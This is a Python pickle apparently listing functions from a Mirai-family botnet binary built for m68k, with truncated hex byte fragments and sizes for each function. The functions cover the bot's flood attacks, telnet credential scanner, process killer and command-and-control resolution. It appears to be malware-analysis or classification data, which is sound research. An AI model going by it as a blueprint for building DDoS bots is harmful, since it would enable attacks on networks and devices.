(lp0
(S'_init'
p1
S'4e560061ff0061ff01705e4e'
p2
L20L
tp3
a(S'__do_global_dtors_aux'
p4
S'4e56004a392201885889c980d822018841f900004a88487901'
p5
L78L
tp6
a(S'call___do_global_dtors_aux'
p7
S'4e56004e5e4e'
p8
L8L
tp9
a(S'frame_dummy'
p10
S'4e560041f900004a88487901487901'
p11
L62L
tp12
a(S'call_frame_dummy'
p13
S'4e56004e5e4e'
p14
L8L
tp15
a(S'_start'
p16
S'9dce2020574851487901424879009448502f0080a2f5'
p17
L38L
tp18
a(S'attack_app_http'
p19
S'4fefae18382051fc22520440001f4100af514e42af5152428000a74878152f0000464fef00202f4051564280007901504878142f521000002000202f40515a428000a74878082f521000002d100840515e4280007901544878162f2f521000002d100840516210007801002f2f5210000022002f405142800078504878072f2f5210000000003f40516a06813c0001002f0100daef00af515e002251626000182f516200c1'
p20
L10564L
tp21
a(S'attack_init'
p22
S'594f48790042a761ff005450'
p23
L186L
tp24
a(S'attack_kill_all'
p25
S'594f42976020e541f9805420084a8017e541f9805420084878090000a317e541f9805442b00070b06cbc6d0a4e'
p26
L84L
tp27
a(S'attack_parse'
p28
S'4fef'
p29
L800L
tp30
a(S'attack_start'
p31
S'4fef'
p32
L264L
tp33
a(S'attack_get_opt_str'
p34
S'4fefff200022001f40001f4100af00603a2f0022d290811428042f00182f0022d2908114906014af00428000b0006eba2020ef00'
p35
L110L
tp36
a(S'attack_get_opt_int'
p37
S'4fefff200022001f40001f4100800081a72f002f0001'
p38
L96L
tp39
a(S'attack_get_opt_ip'
p40
S'4fefff200022001f40001f4100800081a72f002f0001'
p41
L92L
tp42
a(S'add_attack'
p43
S'514f2f022f001f400048780648780100b450'
p44
L140L
tp45
a(S'free_opts'
p46
S'594f4aaf0050429760381722d2908108101e2022d2908108100000b658'
p47
L92L
tp48
a(S'attack_gre_ip'
p49
S'4fefff2f0000001f410080004878040000b350'
p50
L1832L
tp51
a(S'attack_gre_eth'
p52
S'4fefff2f0000410080004878040000acc2202f40008000a74878022f00'
p53
L2018L
tp54
a(S'attack_tcp_syn'
p55
S'4fef'
p56
L1912L
tp57
a(S'attack_tcp_ack'
p58
S'4fefff20002f0040001f410042800048780400009d682f400042800042a74878022f0061'
p59
L1900L
tp60
a(S'attack_tcp_stomp'
p61
S'4feffe20011f40001f41008000487810000095fc50'
p62
L2360L
tp63
a(S'attack_udp_generic'
p64
S'4fefff48e7202f0000001f410042800048780400008c50'
p65
L1396L
tp66
a(S'attack_udp_vse'
p67
S'4fefff48e7202f0000001f4100428000487804000087'
p68
L1310L
tp69
a(S'attack_udp_dns'
p70
S'4fefff2200001f410080004878040000'
p71
L1596L
tp72
a(S'attack_udp_plain'
p73
S'4fefff48e7202f002f0040001f4100800048780400007b50'
p74
L876L
tp75
a(S'get_dns_resolver'
p76
S'4feff761ff008f48781e61ff0050'
p77
L524L
tp78
a(S'checksum_generic'
p79
S'594f2f02001a6f00100080'
p80
L124L
tp81
a(S'checksum_tcpudp'
p82
S'4fef'
p83
L288L
tp84
a(S'killer_init'
p85
S'4fefef402f027c00901000615a58'
p86
L1316L
tp87
a(S'killer_kill'
p88
S'20800c7809000059124e'
p89
L22L
tp90
a(S'killer_kill_by_port'
p91
S'4fefdd2240002206813c0000002f01006aef0006813c0000002f01004c4fef002d00022f002f01003200af2242af22ef004290588858882000d0efca22af2280002f0000348f3270d0002f010050ae4fef000d61ff0058'
p92
L1692L
tp93
a(S'has_exe_access'
p94
S'4fefefe0023c00248f80eff42f401048780661ff0058'
p95
L342L
tp96
a(S'memory_scan_match'
p97
S'4fefefc83742a72f2f10ff0050'
p98
L534L
tp99
a(S'mem_exists'
p100
S'514f42af002f00b0006f3c976046200c102f0040d1001000000052af002f00af000a80af00af0070b000bc20504f4e'
p101
L96L
tp102
a(S'main'
p103
S'4feff94c2f0302069820c410000051f458'
p104
L2416L
tp105
a(S'anti_gdb_entry'
p106
S'23801e80e4'
p107
L12L
tp108
a(S'resolve_cnc_addr'
p109
S'594f2f020061ff00'
p110
L182L
tp111
a(S'establish_connection'
p112
S'42a74878010061ff004fef00c080e0ff39a7487803000040ee4fef0040082280e00000010040d20039807901fc0080783c0110397810000100537aef00'
p113
L148L
tp114
a(S'teardown_connection'
p115
S'2080e0ff390000421658'
p116
L50L
tp117
a(S'ensure_single_instance'
p118
S'4fef'
p119
L426L
tp120
a(S'unlock_tbl_if_nodebug'
p121
S'4fefff00001f7c00422f007c763d00422f001f7c48007c7241422f007c6c007c00007c007c7047422f002f007c724a422f00af00af00ff809ac2400020008c40002f7c003c00522f400020008e40002000f42f40002f7c000020002a0020000cd100b0004aaf0042af0060000a00001f773a5b22002f0010081f8052af002f00af0052af002f002f4000d300d0d0000000ff00002f00000040d10010d100af0000b200764214003c8fc2484032e630e7d00240008000770a41ef002f082f00003540007812002f0800a000ef002f08008e1400c2002000244fef00'
p122
L518L
tp123
a(S'rand_init'
p124
S'2f0261ff0058'
p125
L76L
tp126
a(S'rand_next'
p127
S'594f2f0279017a042f000ba8af002f008839c080'
p128
L126L
tp129
a(S'rand_str'
p130
S'2f0a70b0001c6f0061'
p131
L110L
tp132
a(S'rand_alphastr'
p133
S'4fefff2f0280ef43ef00222222222222222212200003'
p134
L248L
tp135
a(S'resolv_domain_to_hostname'
p136
S'4fefff2f2f0061ff00d82252816f000620008000422f0060442018500052af000c0000064a2f001a2f002006100052af00422f00601000200aaf0052af004aaf005ec0004a00200a4fef004e'
p137
L142L
tp138
a(S'resolv_skip_name'
p139
S'514f4297201401806f0010'
p140
L148L
tp141
a(S'resolv_lookup'
p142
S'4fefef1403020048780100535a50'
p143
L1424L
tp144
a(S'resolv_entries_free'
p145
S'4aaf002a6f002802126f00280200004fe4'
p146
L50L
tp147
a(S'recv_strip_null'
p148
S'514f20002f002f002f002f2f0061ff004fef00803800af002200200041d1104a002200200041d110042f00976dd217504f4e'
p149
L98L
tp150
a(S'scanner_init'
p151
S'4feff8542f0302003501283980f8208028b20400e830238004'
p152
L5920L
tp153
a(S'scanner_kill'
p154
S'208028002f00001f5650'
p155
L22L
tp156
a(S'setup_connection'
p157
S'4fefff209058885888588820142804ff6f00280400001da74878010061ff00b6ef006f0040006f002804ffa86f00a81670d0012f0000156f002804a748780300001b00400820142804000001001bef00bc00281040006f00281440002080bc21086f000140004f222014280478100100002d0cef004e'
p158
L268L
tp159
a(S'get_random_ip'
p160
S'514f2f020061'
p161
L424L
tp162
a(S'consume_iacs'
p163
S'4fef'
p164
L480L
tp165
a(S'consume_any_prompt'
p166
S'4fefff702f40006f0028162253816a2f002014301a004820002014301a0020002014301a00242f002014301a00122f002014301a00005280000a004aaf006e9072b20004976004af00174fef004e'
p167
L164L
tp168
a(S'consume_user_prompt'
p169
S'4fef'
p170
L286L
tp171
a(S'consume_pass_prompt'
p172
S'4fef'
p173
L210L
tp174
a(S'consume_resp_prompt'
p175
S'4fefff48781a000a588f00080061ff005250'
p176
L236L
tp177
a(S'add_auth_entry'
p178
S'514f2f0a2f003f400020808a00814091c10e202280b60001003050'
p179
L354L
tp180
a(S'random_auth_entry'
p181
S'4fefff2f02'
p182
L180L
tp183
a(S'report_working'
p184
S'4fefff2f022f004000ff00a042af004aaf006e0014ff0400084878010061ff00904fef004000ff0861ff008c0061ff009a61ff008e42a74878120007f450'
p185
L574L
tp186
a(S'deobf'
p187
S'514f2f2f00ff00f62010800020528061ff00e0'
p188
L194L
tp189
a(S'can_consume'
p190
S'514f2f02d02010281624d42f42002000d00055c049c1002f0080002f001f504f4e'
p191
L70L
tp192
a(S'table_init'
p193
S'48781e4879010300050c78028099487804ff000c781d0d1200050c780280b1781300050c7848010200044fef00781d0d05044fef0078074879010661ff004fef0078050d0761ff004fef00780b80'
p194
L1202L
tp195
a(S'table_unlock_val'
p196
S'514f2000400042800022d290810130410080002f00000058'
p197
L58L
tp198
a(S'table_lock_val'
p199
S'514f2000400042800022d290810130410080002f0000004e'
p200
L58L
tp201
a(S'table_retrieve_val'
p202
S'594f200022d290810130812028040080'
p203
L62L
tp204
a(S'add_entry'
p205
S'514f2000400020000000222f40002f002f002f00ff00984fef00800022d290812142812f00402022d29081314e'
p206
L118L
tp207
a(S'toggle_obf'
p208
S'4fefff2000400042800022d29081013041002080ea80ea2080ea002080ea0042af00009e2008102f0041d32008102f0041d112100000800022200041d32008102f0041d11210002008102f0041d32008102f0041d1121000b31222200041d32008102f0041d1121000b312200828040080'
p209
L284L
tp210
a(S'util_strlen'
p211
S'594f4297600220081056c0004a0020584f4e'
p212
L34L
tp213
a(S'util_strncmp'
p214
S'4fefff2f2f0061'
p215
L118L
tp216
a(S'util_strcmp'
p217
S'4fefff2f2f0061'
p218
L108L
tp219
a(S'util_strcpy'
p220
S'594f2f2f00'
p221
L46L
tp222
a(S'util_memcpy'
p223
S'514faf006f0000106f0010571000af00ffe44f4e'
p224
L46L
tp225
a(S'util_zero'
p226
S'594faf006006201053af00ffee584f4e'
p227
L30L
tp228
a(S'util_atoi'
p229
S'4fef'
p230
L452L
tp231
a(S'util_itoa'
p232
S'4fefff2f020008006000d80000ba00422f0074b4004aaf00122f40002f008000605842af006f0038220000244c41202f40000908af000670d100200000802000004c4020202f400053af004aaf00ae4aaf000c2f001fbc6004af00200041ef00d12f082f00'
p233
L248L
tp234
a(S'util_memsearch'
p235
S'4fefff42af002000af00067080af003c2f0040d10012200020ef0010b018002000b0000e200080601642af0052af002f00af00804fef00'
p236
L112L
tp237
a(S'util_stristr'
p238
S'4fef'
p239
L228L
tp240
a(S'util_local_addr'
p241
S'4fefff702f4000ff00429042a74878020061ff00e4ef00400070b0000497606e3f7c02083c0808001358'
p242
L172L
tp243
a(S'util_fdgets'
p244
S'4fefff42af0042af002f00af007801002f00ff000c400070b0000a2f00806004af005700011e2000af006c142f00af004053881000a0086f000404af002f00404fef004e'
p245
L138L
tp246
a(S'util_isupper'
p247
S'514f200040000c00066f1000066e082f40006004af002000504f4e'
p248
L46L
tp249
a(S'util_isalpha'
p250
S'514f200040000c00066f0800066f1000066f1000066e082f40006004af002000504f4e'
p251
L62L
tp252
a(S'util_isspace'
p253
S'514f200040000c0000182f0000102f0000082f0000082f40006004af002000504f4e'
p254
L62L
tp255
a(S'util_isdigit'
p256
S'514f200040000c00006f1000006e082f40006004af002000504f4e'
p257
L46L
tp258
a(S'fcntl'
p259
S'4e56ff2f0302002dff2058802d0cae0010b20008b0001c'
p260
L188L
tp261
a(S'__syscall_fcntl64'
p262
S'4e56'
p263
L88L
tp264
a(S'fcntl64'
p265
S'4e56'
p266
L54L
tp267
a(S'__syscall_chdir'
p268
S'4e56'
p269
L62L
tp270
a(S'chdir'
p271
S'4e56002f0061b84e'
p272
L16L
tp273
a(S'close'
p274
S'4e56'
p275
L60L
tp276
a(S'fork'
p277
S'4e56'
p278
L56L
tp279
a(S'getpid'
p280
S'4e56'
p281
L56L
tp282
a(S'getppid'
p283
S'4e56'
p284
L56L
tp285
a(S'ioctl'
p286
S'4e56ff48e700002dff2058802d00fc2d6e'
p287
L130L
tp288
a(S'__syscall_kill'
p289
S'4e56'
p290
L72L
tp291
a(S'kill'
p292
S'4e56002f000061aa50'
p293
L20L
tp294
a(S'__syscall_open'
p295
S'4e56ff48e700003d6e004284ff200c0408094e402d'
p296
L94L
tp297
a(S'open'
p298
S'4e56'
p299
L80L
tp300
a(S'creat'
p301
S'4e56002f0078412f0061'
p302
L30L
tp303
a(S'prctl'
p304
S'4e56'
p305
L98L
tp306
a(S'read'
p307
S'4e56'
p308
L84L
tp309
a(S'readlink'
p310
S'4e56'
p311
L84L
tp312
a(S'select'
p313
S'4e56'
p314
L100L
tp315
a(S'setsid'
p316
S'4e56'
p317
L56L
tp318
a(S'sigprocmask'
p319
S'4e56ff48e730001c0072b21200047020ff6068'
p320
L160L
tp321
a(S'time'
p322
S'4e56'
p323
L62L
tp324
a(S'unlink'
p325
S'4e56'
p326
L62L
tp327
a(S'write'
p328
S'4e56'
p329
L84L
tp330
a(S'closedir'
p331
S'4e56'
p332
L198L
tp333
a(S'opendir'
p334
S'4e56ff0061'
p335
L350L
tp336
a(S'readdir'
p337
S'4e56ff4aae001200017020600000d080162f0001'
p338
L292L
tp339
a(S'__errno_location'
p340
S'4e56002001f4205e4e'
p341
L16L
tp342
a(S'clock'
p343
S'4e56'
p344
L76L
tp345
a(S'_wordcopy_bwd_aligned'
p346
S'4e56ff42ae'
p347
L638L
tp348
a(S'_wordcopy_bwd_dest_aligned'
p349
S'4e56ff2f02'
p350
L578L
tp351
a(S'memmove'
p352
S'4e56'
p353
L288L
tp354
a(S'memset'
p355
S'4e56ff2df470b000001400000080002d'
p356
L310L
tp357
a(S'ntohl'
p358
S'4e560020004e5e4e'
p359
L12L
tp360
a(S'ntohs'
p361
S'4e56'
p362
L22L
tp363
a(S'htonl'
p364
S'4e560020004e5e4e'
p365
L12L
tp366
a(S'htons'
p367
S'4e56'
p368
L22L
tp369
a(S'inet_addr'
p370
S'4e56'
p371
L48L
tp372
a(S'accept'
p373
S'4e56ff20002d00002deeff2f08001850'
p374
L50L
tp375
a(S'bind'
p376
S'4e56ff20002d006e00'
p377
L48L
tp378
a(S'connect'
p379
S'4e56ff20002d006e00'
p380
L48L
tp381
a(S'getsockname'
p382
S'4e56ff20002d00002deeff2f080061ff002c'
p383
L50L
tp384
a(S'getsockopt'
p385
S'4e56'
p386
L66L
tp387
a(S'listen'
p388
S'4e56'
p389
L42L
tp390
a(S'recv'
p391
S'4e56ff20002d006e00'
p392
L56L
tp393
a(S'recvfrom'
p394
S'4e56'
p395
L72L
tp396
a(S'send'
p397
S'4e56ff20002d006e00'
p398
L56L
tp399
a(S'sendto'
p400
S'4e56'
p401
L70L
tp402
a(S'setsockopt'
p403
S'4e56'
p404
L64L
tp405
a(S'socket'
p406
S'4e56ff20002d00002deeff2f080061ff004850'
p407
L50L
tp408
a(S'raise'
p409
S'4e560061'
p410
L28L
tp411
a(S'sigaddset'
p412
S'4e56'
p413
L70L
tp414
a(S'sigemptyset'
p415
S'4e56'
p416
L60L
tp417
a(S'signal'
p418
S'4e56'
p419
L238L
tp420
a(S'__sigismember'
p421
S'4e56ff20008080a840'
p422
L80L
tp423
a(S'__sigaddset'
p424
S'4e56'
p425
L68L
tp426
a(S'__sigdelset'
p427
S'4e56'
p428
L72L
tp429
a(S'__malloc_from_heap'
p430
S'4e56'
p431
L466L
tp432
a(S'malloc'
p433
S'4e56'
p434
L168L
tp435
a(S'calloc'
p436
S'4e56ff200008002dae0022'
p437
L118L
tp438
a(S'__heap_delete'
p439
S'4e5600200c2804806e00680028084000200c280816200c6800280440000e200c28046e0020'
p440
L88L
tp441
a(S'__free_to_heap'
p442
S'4e56'
p443
L342L
tp444
a(S'free'
p445
S'4e5600487901c00108'
p446
L32L
tp447
a(S'realloc'
p448
S'4e56'
p449
L408L
tp450
a(S'__heap_delete_0'
p451
S'4e5600200c2804806e00680028084000200c280816200c6800280440000e200c28046e0020'
p452
L88L
tp453
a(S'__heap_free_area_alloc'
p454
S'4e56'
p455
L66L
tp456
a(S'__heap_alloc'
p457
S'4e56ff2f026e00ae'
p458
L150L
tp459
a(S'__heap_delete_1'
p460
S'4e5600200c2804806e00680028084000200c280816200c6800280440000e200c28046e0020'
p461
L88L
tp462
a(S'__heap_free_area_alloc_0'
p463
S'4e56'
p464
L66L
tp465
a(S'__heap_alloc_at'
p466
S'4e56ff2f02'
p467
L144L
tp468
a(S'__heap_link_free_area'
p469
S'4e5600200c6e00046e006e00004aae000c6e00210c04086e0020000a6e006e00084e'
p470
L70L
tp471
a(S'__heap_link_free_area_after'
p472
S'4e56004aae000c6e00210c04086e0020006e00004e5e4e'
p473
L44L
tp474
a(S'__heap_add_free_area'
p475
S'4e56'
p476
L66L
tp477
a(S'__heap_free'
p478
S'4e56'
p479
L404L
tp480
a(S'atol'
p481
S'4e560048780a2f0061ff000cef005e4e'
p482
L28L
tp483
a(S'strtol'
p484
S'4e5600487801002f000061ff000e4fef004e5e4e'
p485
L34L
tp486
a(S'_stdlib_strto_l'
p487
S'4e56'
p488
L562L
tp489
a(S'exit'
p490
S'4e56ff200016487901f82f00ff2f0800034fef007901f861ff00ec58'
p491
L122L
tp492
a(S'sleep'
p493
S'4e56fe20002daeff4aae0008fe0220eeff48ff600c'
p494
L558L
tp495
a(S'__uClibc_fini'
p496
S'4e56'
p497
L106L
tp498
a(S'__pthread_return_0'
p499
S'4e56004280'
p500
L10L
tp501
a(S'_pthread_cleanup_push_defer'
p502
S'4e56004e5e4e'
p503
L8L
tp504
a(S'__check_suid'
p505
S'4e56'
p506
L92L
tp507
a(S'__check_one_fd'
p508
S'4e56'
p509
L68L
tp510
a(S'__uClibc_init'
p511
S'4e56002080'
p512
L74L
tp513
a(S'__uClibc_main'
p514
S'4e56ff230080dcee0001ec2000102380e06e00222080e081e5d080e07878a7200680ff00'
p515
L582L
tp516
a(S'__socketcall'
p517
S'4e56'
p518
L74L
tp519
a(S'__syscall_exit'
p520
S'4e56'
p521
L56L
tp522
a(S'_exit'
p523
S'4e56002f0061be'
p524
L14L
tp525
a(S'__syscall_fstat'
p526
S'4e56'
p527
L74L
tp528
a(S'fstat'
p529
S'4e56'
p530
L54L
tp531
a(S'__getdents'
p532
S'4e56ff2f002f000061ff005e4fef00ae'
p533
L278L
tp534
a(S'__syscall_getdents64'
p535
S'4e56'
p536
L88L
tp537
a(S'__getdents64'
p538
S'4e56ff2f02'
p539
L548L
tp540
a(S'getegid'
p541
S'4e56'
p542
L60L
tp543
a(S'geteuid'
p544
S'4e56'
p545
L60L
tp546
a(S'getgid'
p547
S'4e56'
p548
L60L
tp549
a(S'getuid'
p550
S'4e56'
p551
L60L
tp552
a(S'__syscall_llseek'
p553
S'4e56'
p554
L98L
tp555
a(S'lseek64'
p556
S'4e56'
p557
L108L
tp558
a(S'nanosleep'
p559
S'4e56'
p560
L78L
tp561
a(S'sbrk'
p562
S'4e56'
p563
L106L
tp564
a(S'times'
p565
S'4e56'
p566
L62L
tp567
a(S'__xstat64_conv'
p568
S'4e56'
p569
L336L
tp570
a(S'__xstat_conv'
p571
S'4e56ff48785442a72f00'
p572
L316L
tp573
a(S'_wordcopy_fwd_aligned'
p574
S'4e56ff70c0f470b0ff0038ffd001300000000110386000200c50'
p575
L566L
tp576
a(S'_wordcopy_fwd_dest_aligned'
p577
S'4e56ff2f02000381f820'
p578
L500L
tp579
a(S'memcpy'
p580
S'4e56'
p581
L240L
tp582
a(S'inet_aton'
p583
S'4e56'
p584
L362L
tp585
a(S'sigaction'
p586
S'4e56'
p587
L232L
tp588
a(S'_dl_aux_init'
p589
S'4e560030d1002000c000d1002000c04e'
p590
L44L
tp591
a(S'brk'
p592
S'4e56'
p593
L64L
tp594
a(S'__syscall_rt_sigaction'
p595
S'4e56'
p596
L94L
tp597
a(S'__do_global_ctors_aux'
p598
S'4e56002f0a80c080c0884e9020ff6e'
p599
L42L
tp600
a(S'call___do_global_ctors_aux'
p601
S'4e56004e5e4e'
p602
L8L
tp603
a(S'_fini'
p604
S'4e560061'
p605
L14L
tp606
a.